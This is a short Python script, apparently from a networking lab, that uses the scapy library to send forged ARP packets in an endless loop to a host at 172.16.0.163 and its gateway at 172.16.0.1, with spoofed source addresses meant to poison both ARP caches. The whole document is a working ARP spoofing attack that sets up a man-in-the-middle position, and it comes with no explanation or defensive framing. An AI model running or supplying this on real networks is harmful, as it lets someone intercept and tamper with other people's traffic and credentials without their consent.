#!/usr/bin/env python
import scapy.all as scp

while True:
	vpacket = scp.ARP(op=1, pdst="172.16.0.163", hwdst="08:00:27:ec:ab:3e", psrc="172.16.0.1")
	rpacket = scp.ARP(op=1, pdst="172.16.0.1", hwdst="08:00:27:95:78:30", psrc="172.16.0.163")
	scp.send(vpacket)
	scp.send(rpacket)
